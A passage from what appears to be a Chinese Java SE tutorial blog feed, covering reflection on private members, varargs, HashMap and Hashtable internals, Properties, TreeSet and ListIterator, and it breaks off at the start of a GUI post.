java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  反射获取私有化构造方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;<br><span class="hljs-comment">//        Student stu = new Student(&quot;Andy&quot;);//正常的方式不能访问，因为私有的在类外不能访问</span><br><br>        Class&lt;Student&gt; c = Student.class;<span class="hljs-comment">//获取Student类的class对象</span><br><br>        <span class="hljs-comment">//获取Student类内部的构造方法，getConstructor只能获取public修改的构造方法</span><br><span class="hljs-comment">//        Constructor&lt;Student&gt; con = c.getConstructor(String.class);</span><br><br><span class="hljs-comment">//        getDeclaredConstructor该方法可以获取修饰符的对象，获取私有化构造方法的对象</span><br>        Constructor&lt;Student&gt; con = c.getDeclaredConstructor(String.class);<br><br>        <span class="hljs-comment">//抑制权限检测</span><br>        con.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//将构造方法对象进行实例化的过程newInstance</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">stu</span> <span class="hljs-operator">=</span> con.newInstance(<span class="hljs-string">&quot;Andy&quot;</span>);<br><br>        System.out.println(stu);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="fe95b7c5"></a></p><h3 id="1-5-反射获取私有化成员变量"><a href="#1-5-反射获取私有化成员变量" class="headerlink" title="1.5 - 反射获取私有化成员变量"></a>1.5 - 反射获取私有化成员变量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> reflex;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  反射获取私有化成员变量</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo08</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;<br>        Class&lt;Student&gt; c = Student.class;<span class="hljs-comment">//获取Student类的class对象</span><br><br>        <span class="hljs-comment">//获取私有化的成员变量对象</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br><br>        <span class="hljs-comment">//获取公有无参构造方法对象并实例化</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">stu</span> <span class="hljs-operator">=</span> c.getConstructor().newInstance();<br><br>        <span class="hljs-comment">//抑制权限检测</span><br>        age.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//给成员变量设置值</span><br>        <span class="hljs-comment">//参数1：表示你想修改哪个对象中的成员变量，参数2：设置的实际值</span><br>        age.set(stu,<span class="hljs-number">18</span>);<br><br>        System.out.println(stu);<span class="hljs-comment">//打印学生对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="1b01cc12"></a></p><h3 id="1-6-反射获取私有化成员方法"><a href="#1-6-反射获取私有化成员方法" class="headerlink" title="1.6 - 反射获取私有化成员方法"></a>1.6 - 反射获取私有化成员方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO反射获取私有化成员方法并调用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;<br>        Class&lt;Student&gt; c = Student.class;<span class="hljs-comment">//获取Student类的Class对象</span><br><br>        <span class="hljs-comment">//获取私有成员方法对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">methodPri</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;methodPri&quot;</span>, String.class);<br><br>        <span class="hljs-comment">//获取公有无参的构造方法对象并实例化</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> c.getConstructor().newInstance();<br><br>        <span class="hljs-comment">//抑制权限检测</span><br>        methodPri.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//调用方法</span><br>        methodPri.invoke(student,<span class="hljs-string">&quot;String&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="0c8a8fbe"></a></p><h3 id="1-7-通过反射绕过泛型检测机制"><a href="#1-7-通过反射绕过泛型检测机制" class="headerlink" title="1.7 - 通过反射绕过泛型检测机制"></a>1.7 - 通过反射绕过泛型检测机制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO   通过反射绕过泛型检测机制</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        ArrayList&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<span class="hljs-comment">//创建集合，用来存储整数类型</span><br><br>        list.add(<span class="hljs-number">9527</span>);<br><span class="hljs-comment">//        list.add(&quot;9527&quot;);</span><br><span class="hljs-comment">//        list.add(3.14);</span><br><span class="hljs-comment">//        list.add(3.14f);</span><br><span class="hljs-comment">//        list.add(&#x27;A&#x27;);</span><br><br>        System.out.println(<span class="hljs-string">&quot;使用反射前：&quot;</span> + list);<br><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&gt; c = list.getClass();<span class="hljs-comment">//获取集合的class对象</span><br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">add</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;add&quot;</span>, Object.class);<span class="hljs-comment">//获取add方法的对象</span><br><br>        add.invoke(list,<span class="hljs-string">&quot;9527&quot;</span>);<br>        add.invoke(list,<span class="hljs-number">3.14</span>);<br>        add.invoke(list,<span class="hljs-number">3.14f</span>);<br>        add.invoke(list,<span class="hljs-string">&#x27;A&#x27;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;使用反射后：&quot;</span> + list);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="7d6250af"></a></p><h2 id="2-可变长参数"><a href="#2-可变长参数" class="headerlink" title="2 - 可变长参数"></a>2 - 可变长参数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  可变长参数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(mySum(<span class="hljs-number">1</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>));<br>        System.out.println(mySum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>));<br><br><span class="hljs-comment">//        System.out.println(mySum(mySum(1,2),3));</span><br><span class="hljs-comment">//        System.out.println(mySum(mySum(mySum(1,2),3),4));</span><br>    &#125;<br><br>    <span class="hljs-comment">/*可变长参数可以不传实参，也可以传递多个参数，但是位置必须放在列表的最后面</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mySum</span><span class="hljs-params">(<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> ... a)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : a) &#123;<br>            sum += n;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>反射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---哈希表/散列表</title>
    <link href="/2020/05/16/JavaSe%E5%9F%BA%E7%A1%80---%E5%93%88%E5%B8%8C%E8%A1%A8-%E6%95%A3%E5%88%97%E8%A1%A8/"/>
    <url>/2020/05/16/JavaSe%E5%9F%BA%E7%A1%80---%E5%93%88%E5%B8%8C%E8%A1%A8-%E6%95%A3%E5%88%97%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="哈希表-散列表-数据结构"><a href="#哈希表-散列表-数据结构" class="headerlink" title="哈希表&#x2F;散列表 数据结构"></a>哈希表&#x2F;散列表 数据结构</h3><ul><li>1.HashMap集合底层是一个哈希表&#x2F;散列表数据结构</li><li>2.哈希表是一个数组和单项链表得结合体。数组在查询方面效率很高，随机增删效率低，而单向链表在随机增删方面效率高，在查询方面效率低，哈希表则将以上两种优点结合，充分发挥各自优点</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&#123;<br>Node &lt;k,v&gt; [] table;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &lt;k,v&gt;&#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> hash; <span class="hljs-comment">//哈希值</span><br>        <span class="hljs-keyword">final</span> k key; <span class="hljs-comment">//存储到Map集合中得Key</span><br>        V value; <span class="hljs-comment">//存储到Map集合中得value</span><br>        Node&lt;k,v&gt; next; <span class="hljs-comment">//下一个节点得内存地址</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>4.哈希表底层是一个一维数组，这个数组中得每一个元素是一个单向链表(数组和链表得结合体)</p></li><li><p>5.<strong>实现原理：</strong></p><ul><li>(a) map.put(k , v) 实现原理：<ul><li>先将k,v封装到Node对象当中，底层会调用k得hashCode()方法得出哈希值，然后通过哈希算法将哈希值转换成一个数组下标，下标位置上如果没有元素，就把Node添加到这个位置上，如果下标对应位置上有链表，此时会拿着K和链表上的每一个节点中的k进行equals，如果所有得equals方法返回都是false，那么这个新节点将被添加到末尾，如果返回都是true，那么这个节点的value将会被覆盖。</li></ul></li><li>(b) v &#x3D; map.get(k)实现原理：<ul><li>先调用k的hashCode()方法得出哈希值，通过哈希算法转化成数组下标，通过数组下标快速定位到某个位置上，如果这个位置上什么也没有，返回null，如果这个位置上有单向链表，那么会拿着这个参数k和单向链表上的每一个节点中的k进行equals，如果返回的是false,那么get方法返回null，如果其中一个节点的k和参数k进行equals返回true，那么这个节点的value就是我们要找的value,get方法最终返回这个value</li></ul></li><li><strong>为什么哈希表增删效率以及查阅效率都很高？</strong><ul><li>因为增删在链表上完成，查询不需要都扫描，只需要部分扫描</li></ul></li></ul></li><li><p>6.通过上述可以得出HashMap集合中的key先调用两个方法，一个是HashCode()，一个是equals()，这两个方法都需要重写</p></li><li><p>7.HashMap集合的key部分特点：</p><ul><li>无序不可重复。无序是因为不一定挂到哪个链表上，不可重复是因为，equals方法来保证HashMap集合中的key不可重复，如果重复了value会覆盖，放在HashMap集合key部分元素就是放到HasSet中所以HashSet集合中元素也需要重写HashCode()+equals()方法中</li></ul></li><li><p>8.哈希表HashMap使用不当时无法发挥性能!</p><ul><li>(1)假设将所有的HashCode()方法返回值固定为某个值，那么会导致底层哈希表变成了纯单向链表，这种情况我们称为散列分布不均匀。<ul><li>什么是散列均匀：<ul><li>假设有100个元素，10个单向链表那么每个单向链表上有10个节点，这是最佳情况</li></ul></li></ul></li><li>(2)假设将所有的HashCode()方法返回值都设定为不一样的值，那么会导致底层变成纯一维数组，没有链表得概念，也是散列不均匀</li><li>(3)散列分布均匀需要重写hasCode()方法时有一定得技巧。</li><li>(4)*<em>重点：放在</em><em>*<em>hasMp()<strong><strong>集合</strong></strong>key</em>*</em><em>部分的元素，以及放在</em><em><strong>hashSet</strong></em><em>集合中的元素，需要同时重写</em><em><strong>hasCode</strong></em><em>和</em><em><strong>equals</strong></em><em>方法。</em>*</li></ul></li><li><p>9.同一个单向链表上的节点的Hash值相同，因为他们的数组下标是一样的，但是同一个链表上的k和k的equals方法肯定返回false,都不相等。</p><ul><li>*<em>放在</em><em><strong>HashMap</strong></em><em>集合的</em><em><strong>k</strong></em><em>部分元素，以及放在</em><em><strong>HashSet</strong></em><em>集合中的元素需要同时重写</em>**<em>hashCode()<strong><strong>和</strong></strong>equals()</em>*</li></ul></li><li><p>10.<strong>HashMap<strong><strong>集合的默认初始化容量是</strong></strong>16**</strong>，默认加载因子是<strong><strong>0.75</strong></strong>，*<em>这个默认加载因子是当数组容量达到75%时，开始扩容。<strong>HashMap</strong></em><em>集合初始化容量必须是</em><em><strong>2</strong></em><em>的倍数</em>*，这也是官方推荐的，这是因为达到散列均匀，为了提高HashMap集合的存取效率</p></li><li><p>11.向Map集合中存，以及从Map集合中取，都先调用key的HashCode()方法，在调用equals方法</p><ul><li>用put(k,v)举例，什么时候不会调用equals方法？<ul><li>k.hashCode()方法返回哈希值，哈希值经过哈希算法转换成数组下标，数组下标位置上如果是null，则不需要执行(get(k)方法原理同上)</li></ul></li></ul></li><li><p>12.如果一个类的equals方法重写，那么HashCode(）方法也必须重写，并且equals方法返回true，hashCode()返回值也必须相同</p><ul><li>equals方法返回true，表示两个对象相同，在同一链表上比较，那么对于同一个单向链表上的节点来说，他们的哈希值都素hi相同的，所以hashCode()返回值也应该相同</li></ul></li><li><p>13.对于HashMap在JDK8之后有新的改进：如果哈希表单向链表中的元素超过8个，单向链表这种数据结构就会变成红黑树数据结构，当红黑树上的节点少于6个时，会重新把红黑树变成单向链表。</p></li><li><p>14.hashMap()的key部分是否可以为空？</p><ul><li>可以，但是只允许有一个null，否则会覆盖</li></ul></li><li><p>15.hashTable()的key和value是否可以为空？</p><ul><li>不能</li></ul></li><li><p>16.<strong>HashTable<strong><strong>的初始化容量是</strong></strong>11**</strong>，默认加载因子是<strong><strong>0.75f</strong></strong>，扩容是：原容量** *** 2 + 1**</p></li><li><p>17.<strong>HashSet<strong><strong>集合初始化容量是</strong></strong>16**</strong>，初始化容量建议是<strong><strong>2</strong></strong>的倍数，扩容之后是原容量的<strong><strong>2</strong></strong>倍**</p></li></ul><h3 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h3><ul><li>1.Properties是一个Map集合，<strong>继承</strong>Hashtable，<strong>Properties<strong><strong>的</strong></strong>key<strong><strong>和</strong></strong>value<strong><strong>都是</strong></strong>String****类型</strong></li><li>2.Properties被称为属性类对象</li><li>3.Properties是线程安全的</li><li>4.Properties也可以使用put()方法添加元素</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PropertiesText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建对象</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        <span class="hljs-comment">//存</span><br>        pro.setProperty(<span class="hljs-string">&quot;url&quot;</span>,<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>);<br>        pro.setProperty(<span class="hljs-string">&quot;Name&quot;</span>,<span class="hljs-string">&quot;Tom&quot;</span>);<br>        pro.setProperty(<span class="hljs-string">&quot;Pass&quot;</span>,<span class="hljs-string">&quot;78342ce&quot;</span>);<br>        pro.setProperty(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-string">&quot;0ox324234&quot;</span>);<br><br>        <span class="hljs-comment">//取</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> pro.getProperty(<span class="hljs-string">&quot;url&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Name</span> <span class="hljs-operator">=</span> pro.getProperty(<span class="hljs-string">&quot;Name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Pass</span> <span class="hljs-operator">=</span> pro.getProperty(<span class="hljs-string">&quot;Pass&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ID</span> <span class="hljs-operator">=</span> pro.getProperty(<span class="hljs-string">&quot;ID&quot;</span>);<br><br>        System.out.println(url);<br>        System.out.println(Name);<br>        System.out.println(Pass);<br>        System.out.println(ID);<br><br>        System.out.println(<span class="hljs-string">&quot;==========================&quot;</span>);<br><br>        System.out.println(pro.size());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h3><ul><li>1.TreeSet集合底层实际上是一个TreeMap</li><li>2.TreeMap集合底层实际上是一个二叉树</li><li>3.放到TreeSet集合中的元素，等同于放到TreeMap集合key部分了</li><li>4.TreeSet集合中的元素：无序不可重复，但是可以按照元素大小顺序自动排序———-可排序集合</li><li>5.<strong>TreeSet****无法对自定义类型进行排序</strong>，因为，没有自定义类型没有实现java.lang.Comparable接口，导致自定义类型在TreeMap集合中的put方法中向下转型的时候出现异常“java.lang.ClassCastException”</li></ul><h3 id="增强for循环和迭代器"><a href="#增强for循环和迭代器" class="headerlink" title="增强for循环和迭代器"></a>增强for循环和迭代器</h3><blockquote><p>  for（数据类型：变量名 : 需要遍历的数组）{</p><p>  ​循环体;</p><p>  }</p><p>  <strong>注意：在<strong><strong>IDE</strong></strong>中可以使用<strong><strong>iter + ent</strong></strong>键</strong> <strong>可以快速生成增强<strong><strong>for</strong></strong>循环</strong></p></blockquote><ul><li>1.什么是迭代器<ul><li>对过程进行重复，成为迭代.</li><li>迭代器是遍历Collection集合的通用方式，可以对集合遍历的同时进行添加删除等操作</li></ul></li><li>2.迭代器的常用方法<ul><li>next()：返回迭代的下一个元素对象</li><li>hasNext():如果仍有元素可以迭代，则返回true</li></ul></li><li>3.普通迭代器在遍历集合时不能进行添加或删除操作，否则会报：并发修改异常。列表迭代器遍历集合时可以进行添加或删除操作，但必须使用列表迭代器中的方法。如：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.ListIterator;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 需求：判断集合中是否包含“C”如果有则添加“java”</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LsitText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建集合对象</span><br>        <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-comment">//添加元素</span><br>        list.add(<span class="hljs-string">&quot;A&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;B&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;C&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;F&quot;</span>);<br>        <span class="hljs-comment">//根据集合对象获取列表迭代器对象</span><br>        <span class="hljs-type">ListIterator</span> <span class="hljs-variable">iter</span> <span class="hljs-operator">=</span> list.listIterator();<br>        <span class="hljs-comment">//判断集合中是否有元素</span><br>        <span class="hljs-keyword">while</span> (iter.hasNext())&#123;<br>            <span class="hljs-comment">//如果有就获取</span><br><span class="hljs-comment">//为什么要向下转型：因为iter.next()是一个Object类型，但是我们添加的是一个字符串类型，所以需要向下转型</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> (String) iter.next();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;C&quot;</span>.equals(s))&#123;<br>               <span class="hljs-comment">//list.add(&quot;java&quot;); ConcurrentModificationException--&gt;并发修改异常</span><br>                iter.add(<span class="hljs-string">&quot;java&quot;</span>);<br>            &#125;<br>        &#125;<br>        System.out.println(list);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>Java哈希表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---GUI设计</title>
    <link href="/2020/05/16/JavaSe%E5%9F%BA%E7%A1%80---GUI%E8%AE%BE%E8%AE%A1/"/>
    <url>/2020/05/16/JavaSe%E5%9F%BA%E7%A1%80---GUI%E8%AE%BE%E8%AE%A1/</url>
    
